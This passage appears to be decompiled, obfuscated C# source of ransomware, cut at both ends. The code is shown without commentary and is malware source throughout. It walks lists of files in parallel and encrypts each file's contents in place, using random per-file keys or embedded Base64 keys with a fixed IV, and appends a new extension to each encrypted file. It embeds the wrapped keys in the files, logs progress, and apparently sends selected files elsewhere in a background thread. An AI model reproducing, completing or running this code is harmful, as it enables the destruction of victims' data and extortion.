				if (NgbDiBVJKDTW == getString_0(107396811))
				{
					try
					{
						if (yumxjKYoRmmkpGk.qPsEsqVRgYW(item))
						{
							yumxjKYoRmmkpGk.QhHAFUyRZP(item);
						}
					}
					catch
					{
					}
				}
				JEkdiihxCoWf.Add(item);
				if (!IDUZlSGaIfn.Contains(Path.GetDirectoryName(item)))
				{
					IDUZlSGaIfn.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (krdgQbbXWsBnkAs == getString_0(107396811) && fileStream.Length > Convert.ToInt32(bQealBkUmzhp) * 1024 * 1024 && !list3.Contains(text))
					{
						if (pRibgXhmfietto == getString_0(107396811))
						{
							foreach (string item2 in tnUDcbYyevrzGRJA)
							{
								if (item.ToLower().EndsWith(item2) && OGIisKmpnCtjYJtSZ == getString_0(107396811))
								{
									if (Convert.ToInt32(dKLzVpzOOKvyJbR) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											AVKODeXgMr.tvyItwYqcU(getString_0(107401030), getString_0(107401025), getString_0(107400980), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && OGIisKmpnCtjYJtSZ == getString_0(107396345))
								{
									try
									{
										AVKODeXgMr.tvyItwYqcU(getString_0(107401030), getString_0(107401025), getString_0(107400980), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = pNCPZOFhXOgiy.PLYaACyiXPLfDqos(item, Convert.ToInt32(bQealBkUmzhp) * 1024 * 1024);
						byte[] qaGqIxJvWtgUo = pNCPZOFhXOgiy.xjeqXDBiuVwBVy(byte_, Convert.FromBase64String(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						pNCPZOFhXOgiy.nKguzTWYAHcXu(item, qaGqIxJvWtgUo);
						if (string_2 != getString_0(107397862))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107397862))
					{
						szFtOlQGmOL(item, item + string_2, nQCMwcWKyQk);
					}
					else
					{
						szFtOlQGmOL(item, item + getString_0(107397857), nQCMwcWKyQk);
					}
				}
				catch (Exception)
				{
				}
				IL_039b:;
			}
		}
	}

	public static void OuhJaGUSkgjWlKv(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		evlxOkrixnZkwgY.tdXNNsWJFtDVWeIAq CS_0024_003C_003E8__locals0 = new evlxOkrixnZkwgY();
		CS_0024_003C_003E8__locals0.aGPipPUJxaM = list_0;
		CS_0024_003C_003E8__locals0.NWwyysQYwQDK = string_1;
		CS_0024_003C_003E8__locals0.OyagJirLxGEcF = string_2;
		CS_0024_003C_003E8__locals0.OxsDDfqLEi = string_3;
		CS_0024_003C_003E8__locals0.pyrQmieHmmx = new List<string> { getString_0(107400917) };
		if (sWPChGvxft == getString_0(107396345))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				using List<string>.Enumerator enumerator2 = CS_0024_003C_003E8__locals0.aGPipPUJxaM.GetEnumerator();
				while (enumerator2.MoveNext())
				{
					evlxOkrixnZkwgY.zPoLbQDPrHj CS_0024_003C_003E8__locals1 = new evlxOkrixnZkwgY.zPoLbQDPrHj();
					CS_0024_003C_003E8__locals1.xIhpFsMthiO = CS_0024_003C_003E8__locals0;
					CS_0024_003C_003E8__locals1.tDwFwsGDrP = enumerator2.Current;
					if (CS_0024_003C_003E8__locals0.OyagJirLxGEcF.Length != 0)
					{
						string[] oyagJirLxGEcF2 = CS_0024_003C_003E8__locals0.OyagJirLxGEcF;
						int num2 = 0;
						while (num2 < oyagJirLxGEcF2.Length)
						{
							string value2 = oyagJirLxGEcF2[num2];
							if (!CS_0024_003C_003E8__locals1.tDwFwsGDrP.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_0bda;
						}
					}
					try
					{
						if (CS_0024_003C_003E8__locals1.tDwFwsGDrP.EndsWith(CS_0024_003C_003E8__locals0.NWwyysQYwQDK))
						{
							goto IL_0bda;
						}
					}
					catch (Exception)
					{
						goto IL_0bda;
					}
					if (CS_0024_003C_003E8__locals1.tDwFwsGDrP.EndsWith(string_0) && !JEkdiihxCoWf.Contains(CS_0024_003C_003E8__locals1.tDwFwsGDrP))
					{
						if (NgbDiBVJKDTW == evlxOkrixnZkwgY.getString_0(107396828))
						{
							try
							{
								if (yumxjKYoRmmkpGk.qPsEsqVRgYW(CS_0024_003C_003E8__locals1.tDwFwsGDrP))
								{
									yumxjKYoRmmkpGk.QhHAFUyRZP(CS_0024_003C_003E8__locals1.tDwFwsGDrP);
								}
							}
							catch
							{
							}
						}
						JEkdiihxCoWf.Add(CS_0024_003C_003E8__locals1.tDwFwsGDrP);
						Thread thread3 = new Thread((ThreadStart)delegate
						{
							try
							{
								if (SidumIOOlYmWUm)
								{
									Console.WriteLine(evlxOkrixnZkwgY.zPoLbQDPrHj.getString_0(107348636) + CS_0024_003C_003E8__locals1.tDwFwsGDrP + evlxOkrixnZkwgY.zPoLbQDPrHj.getString_0(107349557) + new FileInfo(CS_0024_003C_003E8__locals1.tDwFwsGDrP).Length + evlxOkrixnZkwgY.zPoLbQDPrHj.getString_0(107349536));
									Console.WriteLine(evlxOkrixnZkwgY.zPoLbQDPrHj.getString_0(107349123), JEkdiihxCoWf.Count, DPjjDEUnrYJ, ZzaknwGiCeEd);
									Console.WriteLine(evlxOkrixnZkwgY.zPoLbQDPrHj.getString_0(107349034), VxQUKIskXHMm.Elapsed);
									Console.WriteLine(evlxOkrixnZkwgY.zPoLbQDPrHj.getString_0(107349527));
								}
							}
							catch
							{
							}
						});
						thread3.Priority = ThreadPriority.Normal;
						thread3.IsBackground = true;
						thread3.Start();
						if (!IDUZlSGaIfn.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.tDwFwsGDrP)))
						{
							IDUZlSGaIfn.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.tDwFwsGDrP));
						}
						rkkEfvYkADSUN(CS_0024_003C_003E8__locals1.tDwFwsGDrP);
						try
						{
							new jXmmwQRRLpp().EBPsQUzBBDij(CS_0024_003C_003E8__locals1.tDwFwsGDrP);
						}
						catch
						{
						}
						try
						{
							using FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals1.tDwFwsGDrP, FileMode.Open, FileAccess.Write);
							if (!fileStream2.CanWrite)
							{
								try
								{
									if (SidumIOOlYmWUm)
									{
										Console.WriteLine(evlxOkrixnZkwgY.getString_0(107349599) + CS_0024_003C_003E8__locals1.tDwFwsGDrP + evlxOkrixnZkwgY.getString_0(107349554) + new FileInfo(CS_0024_003C_003E8__locals1.tDwFwsGDrP).Length + evlxOkrixnZkwgY.getString_0(107349533));
										Console.WriteLine(evlxOkrixnZkwgY.getString_0(107349524));
									}
								}
								catch
								{
								}
								nYTitVLsoNLJb(OEjiexKEqeO(evlxOkrixnZkwgY.getString_0(107349387)), evlxOkrixnZkwgY.getString_0(107400242) + CS_0024_003C_003E8__locals1.tDwFwsGDrP + evlxOkrixnZkwgY.getString_0(107400242) + OEjiexKEqeO(evlxOkrixnZkwgY.getString_0(107349394)) + evlxOkrixnZkwgY.getString_0(107400242) + Environment.UserName + evlxOkrixnZkwgY.getString_0(107400242) + OEjiexKEqeO(evlxOkrixnZkwgY.getString_0(107348833)));
							}
						}
						catch (Exception ex18)
						{
							if (SWaMdrdKGgzowGl)
							{
								try
								{
									File.AppendAllText(bDDJFCkjBbYQ, evlxOkrixnZkwgY.getString_0(107398628) + CS_0024_003C_003E8__locals1.tDwFwsGDrP + evlxOkrixnZkwgY.getString_0(107348808) + ex18.Message + evlxOkrixnZkwgY.getString_0(107396514));
								}
								catch (Exception)
								{
								}
							}
							continue;
						}
						try
						{
							try
							{
								if (new FileInfo(CS_0024_003C_003E8__locals1.tDwFwsGDrP).Length != 0L)
								{
									goto end_IL_037b;
								}
								goto end_IL_037b_2;
								end_IL_037b:;
							}
							catch (Exception ex20)
							{
								if (SWaMdrdKGgzowGl)
								{
									try
									{
										File.AppendAllText(bDDJFCkjBbYQ, evlxOkrixnZkwgY.getString_0(107398628) + CS_0024_003C_003E8__locals1.tDwFwsGDrP + evlxOkrixnZkwgY.getString_0(107348759) + ex20.Message + evlxOkrixnZkwgY.getString_0(107396514));
									}
									catch (Exception)
									{
									}
								}
								ZzaknwGiCeEd++;
								goto end_IL_037b_2;
							}
							if (!(krdgQbbXWsBnkAs == evlxOkrixnZkwgY.getString_0(107396828)) || new FileInfo(CS_0024_003C_003E8__locals1.tDwFwsGDrP).Length <= Convert.ToInt32(bQealBkUmzhp) * 1024 * 1024 || CS_0024_003C_003E8__locals0.pyrQmieHmmx.Contains(string_0))
							{
								if (OtvlrYHFRq)
								{
									CS_0024_003C_003E8__locals0.NWwyysQYwQDK = YgTmUCLcTtww + CS_0024_003C_003E8__locals0.NWwyysQYwQDK;
								}
								string text5 = VfObglZXpshJy.puTvlrNJxrKCPF(32);
								string text6 = evlxOkrixnZkwgY.getString_0(107400934);
								text6 = (UpNccIaFzBadyA ? VfObglZXpshJy.ZAaQeGPmgdp() : evlxOkrixnZkwgY.getString_0(107400934));
								string s3 = mhNHGBImqIMFfl.QNVOHiUyNEwNRw(text5 + text6);
								byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
								if (CS_0024_003C_003E8__locals0.NWwyysQYwQDK != evlxOkrixnZkwgY.getString_0(107397879))
								{
									if (!NbfRNVirWcO)
									{
										if (!UpNccIaFzBadyA)
										{
											xpGkySSqwDX(CS_0024_003C_003E8__locals1.tDwFwsGDrP, CS_0024_003C_003E8__locals1.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, nQCMwcWKyQk);
										}
										else
										{
											xpGkySSqwDX(CS_0024_003C_003E8__locals1.tDwFwsGDrP, CS_0024_003C_003E8__locals1.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, Convert.FromBase64String(text5));
										}
									}
									else
									{
										try
										{
											if (!UpNccIaFzBadyA)
											{
												KmXLFgoTfYmkE(CS_0024_003C_003E8__locals1.tDwFwsGDrP, CS_0024_003C_003E8__locals1.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, nQCMwcWKyQk, Convert.FromBase64String(lXgIUpLgAi));
											}
											else
											{
												KmXLFgoTfYmkE(CS_0024_003C_003E8__locals1.tDwFwsGDrP, CS_0024_003C_003E8__locals1.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, Convert.FromBase64String(text5), Convert.FromBase64String(text6));
											}
										}
										catch (Exception ex22)
										{
											if (SWaMdrdKGgzowGl)
											{
												try
												{
													File.AppendAllText(bDDJFCkjBbYQ, evlxOkrixnZkwgY.getString_0(107398628) + CS_0024_003C_003E8__locals1.tDwFwsGDrP + evlxOkrixnZkwgY.getString_0(107397833) + ex22.Message + evlxOkrixnZkwgY.getString_0(107396514));
												}
												catch (Exception)
												{
												}
											}
											ZzaknwGiCeEd++;
											try
											{
												File.Move(CS_0024_003C_003E8__locals1.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, CS_0024_003C_003E8__locals1.tDwFwsGDrP);
											}
											catch (Exception)
											{
											}
											goto end_IL_037b_2;
										}
									}
								}
								else if (!NbfRNVirWcO)
								{
									if (!UpNccIaFzBadyA)
									{
										xpGkySSqwDX(CS_0024_003C_003E8__locals1.tDwFwsGDrP, CS_0024_003C_003E8__locals1.tDwFwsGDrP + evlxOkrixnZkwgY.getString_0(107397874), nQCMwcWKyQk);
									}
									else
									{
										xpGkySSqwDX(CS_0024_003C_003E8__locals1.tDwFwsGDrP, CS_0024_003C_003E8__locals1.tDwFwsGDrP + evlxOkrixnZkwgY.getString_0(107397874), Convert.FromBase64String(text5));
									}
								}
								else
								{
									try
									{
										if (!UpNccIaFzBadyA)
										{
											KmXLFgoTfYmkE(CS_0024_003C_003E8__locals1.tDwFwsGDrP, CS_0024_003C_003E8__locals1.tDwFwsGDrP, nQCMwcWKyQk, Convert.FromBase64String(lXgIUpLgAi));
										}
										else
										{
											KmXLFgoTfYmkE(CS_0024_003C_003E8__locals1.tDwFwsGDrP, CS_0024_003C_003E8__locals1.tDwFwsGDrP, Convert.FromBase64String(text5), Convert.FromBase64String(text6));
										}
									}
									catch (Exception ex25)
									{
										if (SWaMdrdKGgzowGl)
										{
											try
											{
												File.AppendAllText(bDDJFCkjBbYQ, evlxOkrixnZkwgY.getString_0(107398628) + CS_0024_003C_003E8__locals1.tDwFwsGDrP + evlxOkrixnZkwgY.getString_0(107397833) + ex25.Message + evlxOkrixnZkwgY.getString_0(107396514));
											}
											catch (Exception)
											{
											}
										}
										ZzaknwGiCeEd++;
										goto end_IL_037b_2;
									}
								}
								if (UpNccIaFzBadyA)
								{
									if (CS_0024_003C_003E8__locals0.NWwyysQYwQDK != evlxOkrixnZkwgY.getString_0(107397879))
									{
										KFuNWiOQTHKqWciPe(CS_0024_003C_003E8__locals1.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, bytes3);
									}
									else
									{
										KFuNWiOQTHKqWciPe(CS_0024_003C_003E8__locals1.tDwFwsGDrP, bytes3);
									}
								}
								goto IL_0bda;
							}
							CS_0024_003C_003E8__locals0 = new evlxOkrixnZkwgY.MlhxfWYHvBPnrE();
							CS_0024_003C_003E8__locals0.nTnXDlFGnPsXG = CS_0024_003C_003E8__locals1;
							CS_0024_003C_003E8__locals0.xIhpFsMthiO = CS_0024_003C_003E8__locals0;
							try
							{
								if (CS_0024_003C_003E8__locals0.NWwyysQYwQDK != evlxOkrixnZkwgY.getString_0(107397879))
								{
									if (OtvlrYHFRq)
									{
										CS_0024_003C_003E8__locals0.NWwyysQYwQDK = YgTmUCLcTtww + CS_0024_003C_003E8__locals0.NWwyysQYwQDK;
									}
									File.Move(CS_0024_003C_003E8__locals1.tDwFwsGDrP, CS_0024_003C_003E8__locals1.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK);
								}
							}
							catch (Exception ex27)
							{
								if (SWaMdrdKGgzowGl)
								{
									try
									{
										File.AppendAllText(bDDJFCkjBbYQ, evlxOkrixnZkwgY.getString_0(107398628) + CS_0024_003C_003E8__locals1.tDwFwsGDrP + evlxOkrixnZkwgY.getString_0(107348698) + ex27.Message + evlxOkrixnZkwgY.getString_0(107396514));
									}
									catch (Exception)
									{
									}
								}
								ZzaknwGiCeEd++;
								goto end_IL_037b_2;
							}
							CS_0024_003C_003E8__locals0.XmJykDMKNMhzu = evlxOkrixnZkwgY.getString_0(107400934);
							if (CS_0024_003C_003E8__locals0.NWwyysQYwQDK != evlxOkrixnZkwgY.getString_0(107397879))
							{
								CS_0024_003C_003E8__locals0.XmJykDMKNMhzu = CS_0024_003C_003E8__locals1.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK;
							}
							else
							{
								CS_0024_003C_003E8__locals0.XmJykDMKNMhzu = CS_0024_003C_003E8__locals1.tDwFwsGDrP;
							}
							if (pRibgXhmfietto == evlxOkrixnZkwgY.getString_0(107396828))
							{
								Thread thread4 = new Thread((ThreadStart)delegate
								{
									foreach (string item in tnUDcbYyevrzGRJA)
									{
										if (CS_0024_003C_003E8__locals0.XmJykDMKNMhzu.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.xIhpFsMthiO.NWwyysQYwQDK) && OGIisKmpnCtjYJtSZ == evlxOkrixnZkwgY.MlhxfWYHvBPnrE.getString_0(107396835))
										{
											if (Convert.ToInt32(dKLzVpzOOKvyJbR) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.XmJykDMKNMhzu).Length)
											{
												try
												{
													AVKODeXgMr.tvyItwYqcU(evlxOkrixnZkwgY.MlhxfWYHvBPnrE.getString_0(107401054), evlxOkrixnZkwgY.MlhxfWYHvBPnrE.getString_0(107401049), evlxOkrixnZkwgY.MlhxfWYHvBPnrE.getString_0(107401004), CS_0024_003C_003E8__locals0.XmJykDMKNMhzu);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.XmJykDMKNMhzu.ToLower().EndsWith(item) && OGIisKmpnCtjYJtSZ == evlxOkrixnZkwgY.MlhxfWYHvBPnrE.getString_0(107396369))
										{
											try
											{
												AVKODeXgMr.tvyItwYqcU(evlxOkrixnZkwgY.MlhxfWYHvBPnrE.getString_0(107401054), evlxOkrixnZkwgY.MlhxfWYHvBPnrE.getString_0(107401049), evlxOkrixnZkwgY.MlhxfWYHvBPnrE.getString_0(107401004), CS_0024_003C_003E8__locals0.XmJykDMKNMhzu);
											}
											catch
											{
											}
										}
									}
								});
								thread4.Priority = ThreadPriority.Normal;
								thread4.IsBackground = false;
								thread4.Start();
							}
							string text7 = VfObglZXpshJy.puTvlrNJxrKCPF(32);
							string text8 = evlxOkrixnZkwgY.getString_0(107400934);
							text8 = (UpNccIaFzBadyA ? VfObglZXpshJy.ZAaQeGPmgdp() : evlxOkrixnZkwgY.getString_0(107400934));
							string s4 = mhNHGBImqIMFfl.QNVOHiUyNEwNRw(text7 + text8);
							byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
							if (dhEsUcbXeBeyR == evlxOkrixnZkwgY.getString_0(107396362))
							{
								byte[] array2 = null;
								byte[] byte_2 = pNCPZOFhXOgiy.PLYaACyiXPLfDqos(CS_0024_003C_003E8__locals0.XmJykDMKNMhzu, Convert.ToInt32(bQealBkUmzhp) * 1024 * 1024);
								if (pNCPZOFhXOgiy.nKguzTWYAHcXu(QaGqIxJvWtgUo: (!OTLCmOpFsMP) ? (UpNccIaFzBadyA ? pNCPZOFhXOgiy.xjeqXDBiuVwBVy(byte_2, Convert.FromBase64String(text7), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : pNCPZOFhXOgiy.xjeqXDBiuVwBVy(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.OxsDDfqLEi), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (UpNccIaFzBadyA ? FRFdLnqaFph.BWvSzInVLSLIKib(byte_2, Convert.FromBase64String(text7), Convert.FromBase64String(text8)) : FRFdLnqaFph.BWvSzInVLSLIKib(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.OxsDDfqLEi), Convert.FromBase64String(lXgIUpLgAi))), NrVjtCgSTarJ: CS_0024_003C_003E8__locals0.XmJykDMKNMhzu, VLHQPqpLBGisux: bytes4))
								{
									goto IL_0bda;
								}
								try
								{
									File.Move(CS_0024_003C_003E8__locals1.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, CS_0024_003C_003E8__locals1.tDwFwsGDrP);
								}
								catch (Exception)
								{
								}
							}
							else if (!UpNccIaFzBadyA)
							{
								if (LjjjikaIyK.pPZVhaEwmPX(CS_0024_003C_003E8__locals0.XmJykDMKNMhzu, bQealBkUmzhp, CS_0024_003C_003E8__locals0.OxsDDfqLEi, null, Convert.FromBase64String(lXgIUpLgAi)))
								{
									goto IL_0bda;
								}
								try
								{
									File.Move(CS_0024_003C_003E8__locals1.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, CS_0024_003C_003E8__locals1.tDwFwsGDrP);
								}
								catch (Exception)
								{
								}
							}
							else
							{
								if (LjjjikaIyK.pPZVhaEwmPX(CS_0024_003C_003E8__locals0.XmJykDMKNMhzu, bQealBkUmzhp, text7, bytes4, Convert.FromBase64String(text8)))
								{
									goto IL_0bda;
								}
								try
								{
									File.Move(CS_0024_003C_003E8__locals1.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, CS_0024_003C_003E8__locals1.tDwFwsGDrP);
								}
								catch (Exception)
								{
								}
							}
							end_IL_037b_2:;
						}
						catch (Exception)
						{
							goto IL_0bda;
						}
					}
					continue;
					IL_0bda:
					CS_0024_003C_003E8__locals0.aGPipPUJxaM.Remove(CS_0024_003C_003E8__locals1.tDwFwsGDrP);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.aGPipPUJxaM, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new evlxOkrixnZkwgY.tdXNNsWJFtDVWeIAq();
			CS_0024_003C_003E8__locals0.xIhpFsMthiO = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.tDwFwsGDrP = string_0;
			if (CS_0024_003C_003E8__locals0.OyagJirLxGEcF.Length != 0)
			{
				string[] oyagJirLxGEcF = CS_0024_003C_003E8__locals0.OyagJirLxGEcF;
				int num = 0;
				while (num < oyagJirLxGEcF.Length)
				{
					string value = oyagJirLxGEcF[num];
					if (!CS_0024_003C_003E8__locals0.tDwFwsGDrP.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0b55;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.tDwFwsGDrP.EndsWith(CS_0024_003C_003E8__locals0.NWwyysQYwQDK))
				{
					goto IL_0b55;
				}
			}
			catch (Exception)
			{
				goto IL_0b55;
			}
			if (!JEkdiihxCoWf.Contains(CS_0024_003C_003E8__locals0.tDwFwsGDrP))
			{
				if (NgbDiBVJKDTW == evlxOkrixnZkwgY.getString_0(107396828))
				{
					try
					{
						if (yumxjKYoRmmkpGk.qPsEsqVRgYW(CS_0024_003C_003E8__locals0.tDwFwsGDrP))
						{
							yumxjKYoRmmkpGk.QhHAFUyRZP(CS_0024_003C_003E8__locals0.tDwFwsGDrP);
						}
					}
					catch
					{
					}
				}
				JEkdiihxCoWf.Add(CS_0024_003C_003E8__locals0.tDwFwsGDrP);
				Thread thread = new Thread((ThreadStart)delegate
				{
					try
					{
						if (SidumIOOlYmWUm)
						{
							Console.WriteLine(evlxOkrixnZkwgY.tdXNNsWJFtDVWeIAq.getString_0(107348643) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + evlxOkrixnZkwgY.tdXNNsWJFtDVWeIAq.getString_0(107349564) + new FileInfo(CS_0024_003C_003E8__locals0.tDwFwsGDrP).Length + evlxOkrixnZkwgY.tdXNNsWJFtDVWeIAq.getString_0(107349543));
							Console.WriteLine(evlxOkrixnZkwgY.tdXNNsWJFtDVWeIAq.getString_0(107349130), JEkdiihxCoWf.Count, DPjjDEUnrYJ, ZzaknwGiCeEd);
							Console.WriteLine(evlxOkrixnZkwgY.tdXNNsWJFtDVWeIAq.getString_0(107349041), VxQUKIskXHMm.Elapsed);
							Console.WriteLine(evlxOkrixnZkwgY.tdXNNsWJFtDVWeIAq.getString_0(107349534));
						}
					}
					catch
					{
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
				if (!IDUZlSGaIfn.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.tDwFwsGDrP)))
				{
					IDUZlSGaIfn.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.tDwFwsGDrP));
				}
				rkkEfvYkADSUN(CS_0024_003C_003E8__locals0.tDwFwsGDrP);
				try
				{
					new jXmmwQRRLpp().EBPsQUzBBDij(CS_0024_003C_003E8__locals0.tDwFwsGDrP);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.tDwFwsGDrP, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (SidumIOOlYmWUm)
							{
								Console.WriteLine(evlxOkrixnZkwgY.getString_0(107349599) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + evlxOkrixnZkwgY.getString_0(107349554) + new FileInfo(CS_0024_003C_003E8__locals0.tDwFwsGDrP).Length + evlxOkrixnZkwgY.getString_0(107349533));
								Console.WriteLine(evlxOkrixnZkwgY.getString_0(107349524));
							}
						}
						catch
						{
						}
						nYTitVLsoNLJb(OEjiexKEqeO(evlxOkrixnZkwgY.getString_0(107349387)), evlxOkrixnZkwgY.getString_0(107400242) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + evlxOkrixnZkwgY.getString_0(107400242) + OEjiexKEqeO(evlxOkrixnZkwgY.getString_0(107349394)) + evlxOkrixnZkwgY.getString_0(107400242) + Environment.UserName + evlxOkrixnZkwgY.getString_0(107400242) + OEjiexKEqeO(evlxOkrixnZkwgY.getString_0(107348833)));
					}
				}
				catch (Exception ex2)
				{
					if (SWaMdrdKGgzowGl)
					{
						try
						{
							File.AppendAllText(bDDJFCkjBbYQ, evlxOkrixnZkwgY.getString_0(107398628) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + evlxOkrixnZkwgY.getString_0(107348808) + ex2.Message + evlxOkrixnZkwgY.getString_0(107396514));
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					return;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.tDwFwsGDrP).Length != 0L)
						{
							goto end_IL_0348;
						}
						goto end_IL_0348_2;
						end_IL_0348:;
					}
					catch (Exception ex4)
					{
						if (SWaMdrdKGgzowGl)
						{
							try
							{
								File.AppendAllText(bDDJFCkjBbYQ, evlxOkrixnZkwgY.getString_0(107398628) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + evlxOkrixnZkwgY.getString_0(107348759) + ex4.Message + evlxOkrixnZkwgY.getString_0(107396514));
							}
							catch (Exception)
							{
							}
						}
						ZzaknwGiCeEd++;
						goto end_IL_0348_2;
					}
					if (krdgQbbXWsBnkAs == evlxOkrixnZkwgY.getString_0(107396828) && new FileInfo(CS_0024_003C_003E8__locals0.tDwFwsGDrP).Length > Convert.ToInt32(bQealBkUmzhp) * 1024 * 1024)
					{
						try
						{
							if (CS_0024_003C_003E8__locals0.NWwyysQYwQDK != evlxOkrixnZkwgY.getString_0(107397879))
							{
								if (OtvlrYHFRq)
								{
									CS_0024_003C_003E8__locals0.NWwyysQYwQDK = YgTmUCLcTtww + CS_0024_003C_003E8__locals0.NWwyysQYwQDK;
								}
								File.Move(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK);
							}
						}
						catch (Exception ex6)
						{
							if (SWaMdrdKGgzowGl)
							{
								try
								{
									File.AppendAllText(bDDJFCkjBbYQ, evlxOkrixnZkwgY.getString_0(107398628) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + evlxOkrixnZkwgY.getString_0(107348698) + ex6.Message + evlxOkrixnZkwgY.getString_0(107396514));
								}
								catch (Exception)
								{
								}
							}
							ZzaknwGiCeEd++;
							return;
						}
						if (CS_0024_003C_003E8__locals0.NWwyysQYwQDK != evlxOkrixnZkwgY.getString_0(107397879))
						{
							CS_0024_003C_003E8__locals0.tDwFwsGDrP += CS_0024_003C_003E8__locals0.NWwyysQYwQDK;
						}
						if (pRibgXhmfietto == evlxOkrixnZkwgY.getString_0(107396828))
						{
							Thread thread2 = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in tnUDcbYyevrzGRJA)
								{
									if (CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.xIhpFsMthiO.NWwyysQYwQDK) && OGIisKmpnCtjYJtSZ == evlxOkrixnZkwgY.tdXNNsWJFtDVWeIAq.getString_0(107396838))
									{
										if (Convert.ToInt32(dKLzVpzOOKvyJbR) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.tDwFwsGDrP).Length)
										{
											try
											{
												AVKODeXgMr.tvyItwYqcU(evlxOkrixnZkwgY.tdXNNsWJFtDVWeIAq.getString_0(107401057), evlxOkrixnZkwgY.tdXNNsWJFtDVWeIAq.getString_0(107401052), evlxOkrixnZkwgY.tdXNNsWJFtDVWeIAq.getString_0(107401007), CS_0024_003C_003E8__locals0.tDwFwsGDrP);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().EndsWith(item2) && OGIisKmpnCtjYJtSZ == evlxOkrixnZkwgY.tdXNNsWJFtDVWeIAq.getString_0(107396372))
									{
										try
										{
											AVKODeXgMr.tvyItwYqcU(evlxOkrixnZkwgY.tdXNNsWJFtDVWeIAq.getString_0(107401057), evlxOkrixnZkwgY.tdXNNsWJFtDVWeIAq.getString_0(107401052), evlxOkrixnZkwgY.tdXNNsWJFtDVWeIAq.getString_0(107401007), CS_0024_003C_003E8__locals0.tDwFwsGDrP);
										}
										catch
										{
										}
									}
								}
							});
							thread2.IsBackground = false;
							thread2.Priority = ThreadPriority.Normal;
							thread2.Start();
						}
						string text = VfObglZXpshJy.puTvlrNJxrKCPF(32);
						string text2 = evlxOkrixnZkwgY.getString_0(107400934);
						text2 = (UpNccIaFzBadyA ? VfObglZXpshJy.ZAaQeGPmgdp() : evlxOkrixnZkwgY.getString_0(107400934));
						string s = mhNHGBImqIMFfl.QNVOHiUyNEwNRw(text + text2);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (dhEsUcbXeBeyR == evlxOkrixnZkwgY.getString_0(107396362))
						{
							byte[] array = null;
							byte[] byte_ = pNCPZOFhXOgiy.PLYaACyiXPLfDqos(CS_0024_003C_003E8__locals0.tDwFwsGDrP, Convert.ToInt32(bQealBkUmzhp) * 1024 * 1024);
